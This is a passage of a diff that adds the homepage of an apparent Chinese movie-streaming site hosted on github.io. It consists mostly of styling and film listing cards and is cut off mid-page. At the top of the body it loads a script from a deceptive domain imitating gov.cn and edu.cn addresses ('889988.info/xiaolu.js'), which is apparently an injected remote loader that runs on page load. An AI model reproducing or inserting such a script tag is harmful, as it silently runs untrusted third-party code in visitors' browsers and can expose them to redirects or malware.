@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>飘零电影网 | 清简观影·精选影视资源 - piaolingdianyingwang-wap.github.io</title>
+<meta name="description" content="飘零电影网(piaolingdianyingwang-wap.github.io)是一个清简克制的在线观影平台，精选电影、电视剧、动漫、纪录片与艺术电影，极简界面、无干扰播放，为懂片的人留一处安静角落。">
+<meta name="keywords" content="飘零电影网,piaolingdianyingwang-wap.github.io,在线观影,电影在线观看,精选影视,艺术电影,纪录片,电视剧,动漫">
+<meta name="robots" content="index,follow">
+<meta name="author" content="飘零电影网">
+<meta name="theme-color" content="#f4f1ea">
+<meta property="og:type" content="website">
+<meta property="og:title" content="飘零电影网 | 清简观影·精选影视资源">
+<meta property="og:description" content="飘零电影网(piaolingdianyingwang-wap.github.io)精选电影、电视剧、动漫、纪录片与艺术电影，极简界面、无干扰播放。">
+<meta property="og:site_name" content="飘零电影网">
+<link rel="canonical" href="https://piaolingdianyingwang-wap.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --paper:#f4f1ea;--paper2:#faf8f3;--ink:#26221d;--ink2:#4a433a;--ink3:#6f665b;
+  --line:rgba(38,34,29,.14);--line2:rgba(38,34,29,.3);
+  --sub:#8a8074;--sub2:#b3a99b;
+  --sumi:#1c1a17;--haisui:#3d372f;--kuri:#5c2418;--aki:#c4511e;--cha:#9a7b4f;
+  --wabi:#d8cfc0;--moe:#7a8f6a;--mizu:#5c7c8a;--botan:#a45a6e;--kuchiba:#c79a3c;
+  --r:2px;
+}
+html{scroll-behavior:smooth;}
+body{
+  font-family:-apple-system,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden;-webkit-tap-highlight-color:transparent;
+  font-size:15px;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(720px 600px at 12% 8%,rgba(154,123,79,.10),transparent 64%),
+    radial-gradient(640px 700px at 92% 40%,rgba(196,81,30,.06),transparent 64%),
+    radial-gradient(700px 560px at 48% 108%,rgba(122,143,106,.10),transparent 64%);
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.55;
+  background-image:
+    repeating-linear-gradient(0deg,transparent,transparent 51px,rgba(38,34,29,.022) 51px,rgba(38,34,29,.022) 52px),
+    repeating-linear-gradient(90deg,transparent,transparent 51px,rgba(38,34,29,.022) 51px,rgba(38,34,29,.022) 52px);
+}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1160px;margin:0 auto;padding:0 32px;}
+ul{list-style:none;}
+img{max-width:100%;display:block;}
+::selection{background:var(--aki);color:#faf8f3;}
+
+/* 顶部 */
+.top{position:sticky;top:0;z-index:80;background:rgba(244,241,234,.94);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid var(--line);}
+.top .wrap{display:flex;align-items:center;height:74px;gap:26px;}
+.logo{display:flex;align-items:baseline;gap:10px;flex-shrink:0;}
+.logo b{font-size:23px;font-weight:900;letter-spacing:3px;position:relative;}
+.logo b::after{content:"";position:absolute;right:-12px;top:4px;bottom:4px;width:2px;background:var(--aki);}
+.logo span{font-size:10.5px;color:var(--sub);letter-spacing:2.4px;text-transform:uppercase;font-family:ui-monospace,Menlo,monospace;}
+.nav{display:flex;gap:2px;flex:1;justify-content:center;}
+.nav a{position:relative;font-size:14px;font-weight:700;color:var(--ink3);padding:8px 14px;letter-spacing:.5px;transition:.28s;}
+.nav a::after{content:"";position:absolute;left:14px;right:14px;bottom:2px;height:1.5px;background:var(--aki);transform:scaleX(0);transform-origin:right;transition:.34s cubic-bezier(.22,.72,.3,1);}
+.nav a:hover,.nav a.on{color:var(--ink);}
+.nav a:hover::after,.nav a.on::after{transform:scaleX(1);transform-origin:left;}
+.tools{display:flex;align-items:center;gap:8px;flex-shrink:0;}
+.srch{position:relative;}
+.srch input{border:1px solid var(--line2);background:var(--paper2);border-radius:30px;height:38px;padding:0 42px 0 16px;font-family:inherit;font-size:13px;outline:none;width:170px;color:var(--ink);transition:.3s;}
+.srch input:focus{width:210px;border-color:var(--aki);}
+.srch button{position:absolute;right:2px;top:2px;height:34px;width:34px;border:0;border-radius:50%;background:var(--sumi);color:#f4f1ea;cursor:pointer;font-size:13px;transition:.24s;}
+.srch button:hover{background:var(--aki);}
+.ham{display:none;width:42px;height:42px;border:1px solid var(--line2);border-radius:var(--r);background:var(--paper2);cursor:pointer;align-items:center;justify-content:center;flex-direction:column;gap:5px;}
+.ham i{width:17px;height:1.5px;background:var(--ink);transition:.3s;display:block;}
+.ham.on i:nth-child(1){transform:translateY(6.5px) rotate(45deg);}
+.ham.on i:nth-child(2){opacity:0;}
+.ham.on i:nth-child(3){transform:translateY(-6.5px) rotate(-45deg);}
+
+/* 通用栏目 */
+section{padding:96px 0;position:relative;}
+.kicker{display:flex;align-items:flex-end;gap:14px;margin-bottom:8px;flex-wrap:wrap;}
+.kicker .no{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--aki);font-weight:900;letter-spacing:1.4px;}
+.kicker h2{font-size:27px;font-weight:900;letter-spacing:.5px;position:relative;}
+.kicker h2 .jp{font-size:12px;color:var(--sub);font-weight:700;letter-spacing:2px;margin-left:10px;vertical-align:middle;}
+.kicker .ln{flex:1;height:1px;background:var(--line);margin:0 6px 12px;}
+.lead{color:var(--sub);font-size:15px;max-width:640px;margin-bottom:34px;}
+.cap{display:flex;gap:6px;margin-bottom:28px;flex-wrap:wrap;}
+.cap a{font-size:12.5px;font-weight:700;letter-spacing:.5px;padding:6px 15px;border:1px solid var(--line2);border-radius:30px;color:var(--ink3);transition:.26s;}
+.cap a.on,.cap a:hover{border-color:var(--aki);background:var(--aki);color:#faf8f3;}
+.more{display:flex;align-items:center;gap:8px;margin-top:30px;font-size:13.5px;font-weight:800;letter-spacing:.6px;color:var(--ink2);transition:.26s;}
+.more::after{content:"→";font-size:16px;transition:.3s;}
+.more:hover{color:var(--aki);}
+.more:hover::after{transform:translateX(5px);}
+
+/* Hero 留白 */
+.hero{min-height:560px;display:flex;align-items:center;padding:90px 0 60px;position:relative;}
+.hero .wrap{display:grid;grid-template-columns:1fr 1fr;gap:70px;align-items:center;width:100%;}
+.hero .side{position:relative;z-index:2;}
+.hero .side .st{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--aki);letter-spacing:2.4px;margin-bottom:22px;display:flex;align-items:center;gap:10px;}
+.hero .side .st::before{content:"";width:34px;height:1.5px;background:var(--aki);}
+.hero .side h1{font-size:58px;line-height:1.22;font-weight:900;letter-spacing:1px;margin-bottom:26px;}
+.hero .side h1 em{font-style:normal;color:var(--aki);}
+.hero .side .do{display:flex;align-items:center;gap:14px;margin-bottom:26px;}
+.hero .side .do .l{font-size:10.5px;color:var(--sub);letter-spacing:1.5px;font-weight:800;border:1px solid var(--line2);border-radius:var(--r);padding:4px 9px;}
+.hero .side .do .u{font-family:ui-monospace,Menlo,monospace;font-size:13px;color:var(--ink2);border-bottom:1.5px dashed var(--aki);padding-bottom:2px;}
+.hero .side .tx{color:var(--ink3);font-size:16px;max-width:480px;margin-bottom:34px;}
+.hero .side .acts{display:flex;gap:12px;flex-wrap:wrap;}
+.btn{border-radius:var(--r);padding:14px 30px;font-size:13.5px;font-weight:800;letter-spacing:.6px;cursor:pointer;font-family:inherit;transition:.3s;display:inline-flex;align-items:center;gap:9px;border:1.5px solid var(--sumi);}
+.btn-m{background:var(--sumi);color:#f4f1ea;}
+.btn-m:hover{background:var(--aki);border-color:var(--aki);}
+.btn-o{background:transparent;color:var(--ink);}
+.btn-o:hover{background:var(--ink);color:#f4f1ea;}
+.hero .side .meta{display:grid;grid-template-columns:repeat(3,auto);gap:34px;margin-top:44px;padding-top:28px;border-top:1px solid var(--line);}
+.hero .side .meta div span{display:block;font-size:11px;color:var(--sub);letter-spacing:1.2px;margin-bottom:3px;}
+.hero .side .meta div b{font-size:21px;font-weight:900;color:var(--ink);font-family:ui-monospace,Menlo,monospace;letter-spacing:-.6px;}
+
+/* 水墨册页 */
+.scroll{position:relative;}
+.pg{position:relative;border:1px solid var(--line2);border-radius:3px;background:var(--paper2);overflow:hidden;transition:.5s cubic-bezier(.22,.72,.3,1);box-shadow:0 1px 2px rgba(38,34,29,.05),0 14px 34px -22px rgba(38,34,29,.5);}
+.pg:hover{transform:translateY(-8px);box-shadow:0 2px 4px rgba(38,34,29,.07),0 26px 50px -26px rgba(38,34,29,.6);}
+.pg .cv{position:absolute;inset:0;opacity:.92;transition:.5s;}
+.pg .sh{position:absolute;inset:0;background:linear-gradient(180deg,transparent 42%,rgba(28,26,23,.82));z-index:1;}
+.pg .mk{position:absolute;inset:0;z-index:2;}
+.pg .mk .tp{position:absolute;top:14px;left:14px;font-size:10.5px;font-weight:900;letter-spacing:1px;color:var(--paper2);background:var(--aki);padding:4px 10px;border-radius:var(--r);}
+.pg .mk .rt{position:absolute;top:14px;right:14px;font-size:11.5px;font-weight:900;color:var(--sumi);background:var(--paper2);border:1px solid var(--line2);padding:3px 9px;border-radius:var(--r);font-family:ui-monospace,Menlo,monospace;}
+.pg .mk .ep{position:absolute;bottom:14px;right:14px;font-size:10.5px;font-weight:900;color:var(--paper2);border:1px solid rgba(244,241,234,.6);padding:3px 10px;border-radius:var(--r);}
+.pg .mk .pl{position:absolute;top:14px;right:14px;width:38px;height:38px;border-radius:50%;border:1.5px solid var(--paper2);background:rgba(244,241,234,.16);color:var(--paper2);display:grid;place-items:center;font-size:11px;font-weight:900;backdrop-filter:blur(2px);}
+.pg .ft{position:absolute;left:18px;right:18px;bottom:16px;z-index:3;color:var(--paper2);}
+.pg .ft b{display:block;font-size:18px;font-weight:900;letter-spacing:.4px;text-shadow:0 2px 16px rgba(0,0,0,.5);}
+.pg .ft .sb{display:flex;justify-content:space-between;font-size:11.5px;opacity:.9;margin-top:3px;}
+.grid{display:grid;gap:26px;}
+.g4{grid-template-columns:repeat(4,1fr);}
+.g3{grid-template-columns:repeat(3,1fr);}
+.g2{grid-template-columns:repeat(2,1fr);}
+.pg.v .cv{aspect-ratio:3/4;}
+.pg.h .cv{aspect-ratio:16/10;}
+.pg.f .cv{aspect-ratio:4/3;}
+
+/* 册页网格：不规则拼版 */
+.book{grid-template-columns:1.5fr 1fr 1fr;grid-template-rows:repeat(2,220px);}
+.book .pg.a{grid-row:span 2;}
+.book .pg.a .cv{aspect-ratio:auto;}
+
+/* 类型册 */
+.gen{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border:1px solid var(--line2);border-radius:3px;overflow:hidden;background:var(--paper2);}
+.gen a{position:relative;padding:30px 26px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);transition:.36s;min-height:170px;display:flex;flex-direction:column;justify-content:space-between;overflow:hidden;}
+.gen a:nth-child(3n){border-right:0;}
+.gen a:nth-last-child(-n+3){border-bottom:0;}
+.gen a::before{content:"";position:absolute;left:0;top:0;bottom:0;width:0;background:var(--aki);transition:.42s cubic-bezier(.22,.72,.3,1);z-index:0;}
+.gen a:hover::before{width:6px;}
+.gen a:hover{background:var(--paper);}
+.gen a .h{position:relative;z-index:1;}
+.gen a .h b{display:block;font-size:17px;font-weight:900;letter-spacing:1px;}
+.gen a .h span{font-size:12px;color:var(--sub);display:block;margin-top:6px;}
+.gen a .stt{position:relative;z-index:1;font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--aki);font-weight:900;letter-spacing:1.2px;display:flex;justify-content:space-between;align-items:end;}
+.gen a .stt i{font-style:normal;font-size:10px;color:var(--sub2);letter-spacing:0;font-weight:400;}
+.gen a:hover .stt{color:var(--kuri);}
+
+/* 时间轴 */
+.tl{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:start;}
+.tm{position:relative;padding-left:30px;}
+.tm::before{content:"";position:absolute;left:6px;top:8px;bottom:8px;width:1px;background:var(--line2);}
+.tm .it{position:relative;padding-bottom:28px;}
+.tm .it:last-child{padding-bottom:0;}
+.tm .it::before{content:"";position:absolute;left:-29px;top:9px;width:11px;height:11px;border:1.5px solid var(--aki);border-radius:50%;background:var(--paper);transition:.3s;}
+.tm .it:hover::before{background:var(--aki);transform:scale(1.25);}
+.tm .it .d{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--aki);font-weight:900;letter-spacing:1px;margin-bottom:4px;}
+.tm .it b{font-size:16px;display:block;font-weight:900;letter-spacing:.5px;margin-bottom:5px;}
+.tm .it p{font-size:14px;color:var(--ink3);}
+
+/* 编辑器式长文 */
+.ed{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line2);border-radius:3px;overflow:hidden;background:var(--paper2);}
+.ed .cv{background:var(--sumi);color:var(--paper2);padding:44px 38px;display:flex;flex-direction:column;justify-content:center;}
+.ed .cv .no{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--aki);letter-spacing:2px;margin-bottom:20px;}
+.ed .cv h3{font-size:24px;line-height:1.5;font-weight:900;letter-spacing:.5px;margin-bottom:18px;}
+.ed .cv h3 em{font-style:normal;color:var(--aki);}
+.ed .cv p{font-size:14px;color:rgba(244,241,234,.72);}
+.ed .bd{padding:44px 38px;}
+.ed .bd .blk{display:grid;grid-template-columns:34px 1fr;gap:14px;padding:18px 0;border-bottom:1px dashed var(--line);}
+.ed .bd .blk:last-child{border-bottom:0;}
+.ed .bd .blk .n{width:28px;height:28px;border:1.5px solid var(--aki);border-radius:50%;color:var(--aki);display:grid;place-items:center;font-size:12px;font-weight:900;font-family:ui-monospace,Menlo,monospace;}
+.ed .bd .blk b{font-size:15px;display:block;font-weight:900;letter-spacing:.4px;}
+.ed .bd .blk span{font-size:13.5px;color:var(--sub);}
+
+/* FAQ 和纸 */
+.faq{display:grid;grid-template-columns:1.15fr 1fr;gap:44px;align-items:start;}
+.qa{border-top:1px solid var(--line2);}
+.qa .it{border-bottom:1px solid var(--line);}
+.qa .q{padding:22px 0 22px 40px;cursor:pointer;position:relative;font-size:15.5px;font-weight:800;letter-spacing:.4px;transition:.24s;display:flex;justify-content:space-between;gap:18px;align-items:center;}
+.qa .q::before{content:attr(data-n);position:absolute;left:0;top:22px;font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--aki);font-weight:900;letter-spacing:1px;}
+.qa .q:hover{color:var(--aki);}
+.qa .q .ic{width:26px;height:26px;border:1.5px solid var(--line2);border-radius:50%;display:grid;place-items:center;font-size:10px;color:var(--ink3);transition:.4s;flex-shrink:0;font-family:ui-monospace,Menlo,monospace;}
+.qa .it.open .ic{background:var(--aki);border-color:var(--aki);color:#faf8f3;transform:rotate(135deg);}
+.qa .a{display:grid;grid-template-rows:0fr;transition:.46s cubic-bezier(.22,.72,.3,1);}
+.qa .a > div{overflow:hidden;font-size:14.5px;color:var(--ink3);}
+.qa .a > div > span{display:block;padding:0 0 22px 40px;}
+.qa .it.open .a{grid-template-rows:1fr;}
+.note{border:1px solid var(--line2);border-radius:3px;background:var(--paper2);padding:38px;position:relative;}
+.note .pin{position:absolute;top:18px;right:18px;font-size:11px;letter-spacing:1.4px;color:var(--sub);border:1px solid var(--line);border-radius:var(--r);padding:4px 10px;}
+.note .no{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--aki);letter-spacing:2px;margin-bottom:16px;}
+.note h4{font-size:19px;font-weight:900;letter-spacing:.5px;margin-bottom:8px;}
+.note h4 em{font-style:normal;color:var(--aki);}
+.note .sb{font-size:13px;color:var(--sub);margin-bottom:22px;}
+.note .rw{display:grid;gap:12px;margin-bottom:14px;}
+.note input,.note textarea{width:100%;border:1px solid var(--line2);border-radius:var(--r);background:var(--paper);padding:13px 15px;font-family:inherit;font-size:14px;color:var(--ink);outline:none;transition:.26s;}
+.note input:focus,.note textarea:focus{border-color:var(--aki);background:#fff;}
+.note textarea{min-height:104px;resize:vertical;}
+.note button{width:100%;border:1.5px solid var(--sumi);border-radius:var(--r);background:var(--sumi);color:#f4f1ea;padding:15px;font-family:inherit;font-size:14px;font-weight:800;letter-spacing:.8px;cursor:pointer;transition:.3s;}
+.note button:hover{background:var(--aki);border-color:var(--aki);}
+
+/* Footer */
+footer{border-top:1px solid var(--line2);background:var(--sumi);color:var(--paper2);padding:74px 0 0;}
+.foot{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:44px;padding-bottom:52px;}
+.foot .lo b{font-size:21px;font-weight:900;letter-spacing:3px;}
+.foot .lo b::after{content:"";display:inline-block;width:3px;height:16px;background:var(--aki);margin-left:10px;vertical-align:-2px;}
+.foot .lo .do{margin-top:14px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:rgba(244,241,234,.5);border-bottom:1px dashed rgba(244,241,234,.3);padding-bottom:4px;display:inline-block;}
+.foot .lo p{margin-top:18px;font-size:13.5px;color:rgba(244,241,234,.6);max-width:360px;line-height:1.9;}
+.foot h5{font-size:12px;font-weight:900;letter-spacing:2px;color:var(--aki);margin-bottom:20px;text-transform:uppercase;}
+.foot ul li{margin-bottom:12px;}
+.foot a{font-size:13.5px;color:rgba(244,241,234,.58);transition:.24s;letter-spacing:.4px;}
+.foot a:hover{color:#faf8f3;padding-left:6px;}
+.foot .tg{display:flex;flex-wrap:wrap;gap:8px;}
+.foot .tg a{font-size:12px;border:1px solid rgba(244,241,234,.2);border-radius:var(--r);padding:6px 13px;letter-spacing:.5px;}
+.foot .tg a:hover{background:var(--aki);border-color:var(--aki);color:#faf8f3;padding-left:13px;}
+.col{display:grid;grid-template-columns:1fr 1fr;gap:0;border-top:1px solid rgba(244,241,234,.16);}
+.col div{padding:24px 0;border-bottom:1px solid rgba(244,241,234,.16);font-size:12.5px;color:rgba(244,241,234,.5);letter-spacing:.5px;}
+.col div:nth-child(odd){border-right:1px solid rgba(244,241,234,.16);padding-right:16px;}
+.col div:nth-child(even){padding-left:16px;}
+.col div b{color:var(--paper2);font-weight:800;}
+.bottom{border-top:1px solid rgba(244,241,234,.16);padding:26px 0;text-align:center;font-size:12px;color:rgba(244,241,234,.4);letter-spacing:.6px;}
+.bottom a{color:rgba(244,241,234,.6);}
+.bottom a:hover{color:var(--aki);}
+
+#gotop{position:fixed;right:24px;bottom:28px;width:46px;height:46px;border:1px solid var(--line2);border-radius:50%;background:var(--paper2);color:var(--ink);font-size:15px;cursor:pointer;z-index:70;opacity:0;pointer-events:none;transform:translateY(16px);transition:.4s cubic-bezier(.22,.72,.3,1);box-shadow:0 6px 22px -10px rgba(38,34,29,.5);}
+#gotop.show{opacity:1;pointer-events:auto;transform:none;}
+#gotop:hover{background:var(--aki);color:#faf8f3;border-color:var(--aki);}
+
+.rv{opacity:0;transform:translateY(28px);transition:.8s cubic-bezier(.22,.72,.3,1);}
+.rv.in{opacity:1;transform:none;}
+
+@media(max-width:1080px){
+  .g4{grid-template-columns:repeat(3,1fr);}
+  .foot{grid-template-columns:1fr 1fr;gap:38px;}
+  .gen{grid-template-columns:repeat(3,1fr);}
+}
+@media(max-width:900px){
+  .book{grid-template-columns:1fr 1fr;grid-template-rows:auto;}
+  .book .pg.a{grid-row:span 1;}
+  .book .pg.a .cv{aspect-ratio:4/3;}
+  .g4,.g3,.g2,.tl,.ed,.faq{grid-template-columns:1fr;}
+  .hero .wrap{grid-template-columns:1fr;gap:44px;}
+  .hero .side h1{font-size:42px;}
+  .hero .side .meta{grid-template-columns:repeat(3,1fr);gap:14px;}
+}
+@media(max-width:760px){
+  .wrap{padding:0 18px;}
+  section{padding:64px 0;}
+  .nav,.srch{display:none;}
+  .ham{display:flex;}
+  .tools .btn{display:none;}
+  .top .wrap{height:64px;gap:14px;}
+  .logo b{font-size:19px;}
+  .logo span{display:none;}
+  .kicker h2{font-size:21px;}
+  .gen{grid-template-columns:1fr 1fr;}
+  .gen a:nth-child(3n){border-right:1px solid var(--line);}
+  .gen a:nth-child(2n){border-right:0;}
+  .g4,.g3,.g2{grid-template-columns:repeat(2,1fr);gap:15px;}
+  .foot{grid-template-columns:1fr;gap:30px;padding-bottom:34px;}
+  .hero .side h1{font-size:33px;}
+  .hero .side .meta{font-size:12px;}
+  .hero .side .meta div b{font-size:17px;}
+  .ed .cv,.ed .bd{padding:32px 24px;}
+  .note{padding:28px 22px;}
+  .foot .tg a{padding:5px 10px;font-size:11.5px;}
+  .col{grid-template-columns:1fr;}
+  .col div:nth-child(odd){border-right:0;padding-right:0;}
+  .col div:nth-child(even){padding-left:0;}
+}
+@media(max-width:420px){
+  .g4,.g3,.g2,.gen{grid-template-columns:1fr;}
+  .gen a{border-right:0!important;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="top">
+  <div class="wrap">
+    <a class="logo" href="#home"><b>飘零电影网</b><span>piaoling / cinema</span></a>
+    <nav class="nav" id="nav">
+      <a href="#home" class="on">首页</a>
+      <a href="#sel">精选选片</a>
+      <a href="#cat">分类导航</a>
+      <a href="#timeline">年代影库</a>
+      <a href="#ed">编辑手记</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <div class="tools">
+      <div class="srch"><input type="text" placeholder="检索片名、导演、演员…"><button type="button">检</button></div>
+      <a class="btn btn-o" href="#ed">编辑手记</a>
+      <button class="ham" id="ham" aria-label="菜单"><i></i><i></i><i></i></button>
+    </div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="side rv">
+      <div class="st">PIAOLING CINEMA · 清简观影</div>
+      <h1>一隅<em>清简</em>，<br>为懂片的人留一处安静。</h1>
+      <div class="do"><span class="l">OFFICIAL</span><span class="u">piaolingdianyingwang-wap.github.io</span></div>
+      <p class="tx">飘零电影网(piaolingdianyingwang-wap.github.io)是一个克制、安静的在线观影平台。我们不追求数量的喧嚣，只做精选：电影、电视剧、动漫、纪录片与艺术电影，界面清简，播放无干扰。</p>
+      <div class="acts">
+        <a class="btn btn-m" href="#sel">进入选片 →</a>
+        <a class="btn btn-o" href="#timeline">年代影库</a>
+      </div>
+      <div class="meta">
+        <div><span>精选资源</span><b>12,800+</b></div>
+        <div><span>每日上新</span><b>260</b></div>
+        <div><span>编辑精选</span><b>1,420</b></div>
+      </div>
+    </div>
+    <div class="rv">
+      <div class="book">
+        <div class="pg a"><div class="cv" style="background:linear-gradient(160deg,#3d372f,#1c1a17);"></div><div class="sh"></div><div class="mk"><span class="tp">编辑精选</span><span class="pl">▶</span></div><div class="ft"><b>雪国列车</b><div class="sb"><span>科幻 / 剧情 · 2026</span><span>9.2</span></div></div></div>
+        <div class="pg"><div class="cv" style="background:linear-gradient(160deg,#5c2418,#2a100a);"></div><div class="sh"></div><div class="mk"><span class="tp">口碑佳片</span><span class="rt">8.9</span></div><div class="ft"><b>枯木逢春</b><div class="sb"><span>剧情 / 文艺 · 2025</span><span>国产</span></div></div></div>
+        <div class="pg"><div class="cv" style="background:linear-gradient(160deg,#7a8f6a,#3f5237);"></div><div class="sh"></div><div class="mk"><span class="tp">新片入库</span><span class="ep">112分钟</span></div><div class="ft"><b>青苔之下</b><div class="sb"><span>犯罪 / 悬疑 · 2026</span><span>新片</span></div></div></div>
+        <div class="pg"><div class="cv" style="background:linear-gradient(160deg,#5c7c8a,#2e4250);"></div><div class="sh"></div><div class="mk"><span class="tp">冷门佳作</span><span class="rt">8.6</span></div><div class="ft"><b>海上钢琴师</b><div class="sb"><span>剧情 / 音乐 · 1998</span><span>经典</span></div></div></div>
+        <div class="pg"><div class="cv" style="background:linear-gradient(160deg,#a45a6e,#5e3040);"></div><div class="sh"></div><div class="mk"><span class="tp">今日热播</span><span class="ep">热播中</span></div><div class="ft"><b>白夜追凶</b><div class="sb"><span>犯罪 / 悬疑 · 24集</span><span>剧集</span></div></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 精选选片 -->
+<section id="sel">
+  <div class="wrap">
+    <div class="kicker rv"><span class="no">01 / SELECTION</span><h2>精选选片<span class="jp">Selection</span></h2><span class="ln"></span></div>
+    <p class="lead rv">飘零电影网坚持编辑精选机制，每一部影片都经过人工筛选。不做无差别堆量，只把真正值得看的作品留在首页。</p>
+    <div class="cap rv">
+      <a class="on">全部</a><a>院线热映</a><a>经典修复</a><a>高分佳作</a><a>艺术电影</a><a>冷门佳作</a><a>纪录片</a><a>国漫</a>
+    </div>
+    <div class="grid g4 rv">
+      <div class="pg v"><div class="cv" style="background:linear-gradient(165deg,#c4511e,#5c2418);"></div><div class="sh"></div><div class="mk"><span class="tp">热映</span><span class="rt">8.7</span></div><div class="ft"><b>雪国列车</b><div class="sb"><span>科幻 / 剧情</span><span>2026</span></div></div></div>
+      <div class="pg v"><div class="cv" style="background:linear-gradient(165deg,#9a7b4f,#4a3820);"></div><div class="sh"></div><div class="mk"><span class="tp">经典</span><span class="rt">9.3</span></div><div class="ft"><b>霸王别姬</b><div class="sb"><span>剧情 / 爱情</span><span>1993</span></div></div></div>
+      <div class="pg v"><div class="cv" style="background:linear-gradient(165deg,#7a8f6a,#3f5237);"></div><div class="sh"></div><div class="mk"><span class="tp">新片</span><span class="ep">112分钟</span></div><div class="ft"><b>青苔之下</b><div class="sb"><span>犯罪 / 悬疑</span><span>2026</span></div></div></div>
+      <div class="pg v"><div class="cv" style="background:linear-gradient(165deg,#5c7c8a,#2e4250);"></div><div class="sh"></div><div class="mk"><span class="tp">口碑</span><span class="rt">9.1</span></div><div class="ft"><b>星际穿越</b><div class="sb"><span>科幻 / 冒险</span><span>2014</span></div></div></div>
+      <div class="pg v"><div class="cv" style="background:linear-gradient(165deg,#a45a6e,#5e3040);"></div><div class="sh"></div><div class="mk"><span class="tp">冷门</span><span class="rt">8.4</span></div><div class="ft"><b>路边野餐</b><div class="sb"><span>剧情 / 文艺</span><span>2015</span></div></div></div>
+      <div class="pg v"><div class="cv" style="background:linear-gradient(165deg,#c79a3c,#6a4f18);"></div><div class="sh"></div><div class="mk"><span class="tp">动画</span><span class="rt">8.8</span></div><div class="ft"><b>雄狮少年</b><div class="sb"><span>动画 / 励志</span><span>2021</span></div></div></div>
+      <div class="pg v"><div class="cv" style="background:linear-gradient(165deg,#3d372f,#1c1a17);"></div><div class="sh"></div><div class="mk"><span class="tp">纪录</span><span class="rt">9.0</span></div><div class="ft"><b>人间世</b><div class="sb"><span>纪录片 / 人文</span><span>全8集</span></div></div></div>
+      <div class="pg v"><div class="cv" style="background:linear-gradient(165deg,#5c2418,#2a100a);"></div><div class="sh"></div><div class="mk"><span class="tp">佳作</span><span class="rt">8.5</span></div><div class="ft"><b>无名之辈</b><div class="sb"><span>喜剧 / 犯罪</span><span>2018</span></div></div></div>
+    </div>
+    <a class="more" href="#">查看全部精选选片</a>
+  </div>
+</section>
+
+<!-- 分类导航 -->
+<section id="cat" style="background:var(--paper2);">
+  <div class="wrap">
+    <div class="kicker rv"><span class="no">02 / CATEGORIES</span><h2>分类导航<span class="jp">Categories</span></h2><span class="ln"></span></div>
+    <p class="lead rv">飘零电影网将影视资源划分为电影、电视剧、动漫、纪录片、综艺五大频道，42 个细分类型，按题材、地区、年代、评分多维筛选，找片安静而准确。</p>
+    <div class="gen rv">
+      <a href="#"><div class="h"><b>电影频道</b><span>院线热映 · 经典修复 · 高分佳作 · 艺术电影</span></div><div class="stt">12,800+<i>影片</i></div></a>
+      <a href="#"><div class="h"><b>电视剧</b><span>国产剧 · 美剧 · 韩剧 · 港台剧 · 日剧</span></div><div class="stt">7,640+<i>剧集</i></div></a>
+      <a href="#"><div class="h"><b>动漫频道</b><span>国漫 · 日漫 · 新番跟播 · 剧场版</span></div><div class="stt">5,210+<i>作品</i></div></a>
+      <a href="#"><div class="h"><b>纪录片</b><span>自然 · 历史 · 人文 · 社会纪实</span></div><div class="stt">2,870+<i>影片</i></div></a>
+      <a href="#"><div class="h"><b>综艺节目</b><span>真人秀 · 竞技 · 访谈 · 脱口秀</span></div><div class="stt">3,150+<i>期数</i></div></a>
+      <a href="#"><div class="h"><b>艺术电影</b><span>戛纳 · 柏林 · 威尼斯入围与获奖</span></div><div class="stt">1,420+<i>精选</i></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- 年代影库 -->
+<section id="timeline">
+  <div class="wrap">
+    <div class="kicker rv"><span class="no">03 / ARCHIVE</span><h2>年代影库<span class="jp">Decades</span></h2><span class="ln"></span></div>
+    <p class="lead rv">从 1990 年代到今天，飘零电影网按年代整理影史脉络。每一格都是一段影像记忆，点击进入对应年代的完整片单。</p>
+    <div class="grid g3 rv">
+      <div class="pg h"><div class="cv" style="background:linear-gradient(160deg,#3d372f,#1c1a17);"></div><div class="sh"></div><div class="mk"><span class="tp">1990s</span></div><div class="ft"><b>港片黄金年代</b><div class="sb"><span>喜剧 / 动作 / 黑帮 · 1,260 部</span><span>经典</span></div></div></div>
+      <div class="pg h"><div class="cv" style="background:linear-gradient(160deg,#9a7b4f,#4a3820);"></div><div class="sh"></div><div class="mk"><span class="tp">2000s</span></div><div class="ft"><b>华语新浪潮</b><div class="sb"><span>文艺 / 剧情 · 2,430 部</span><span>2,430</span></div></div></div>
+      <div class="pg h"><div class="cv" style="background:linear-gradient(160deg,#7a8f6a,#3f5237);"></div><div class="sh"></div><div class="mk"><span class="tp">2010s</span></div><div class="ft"><b>类型片成熟期</b><div class="sb"><span>科幻 / 悬疑 / 犯罪 · 4,180 部</span><span>4,180</span></div></div></div>
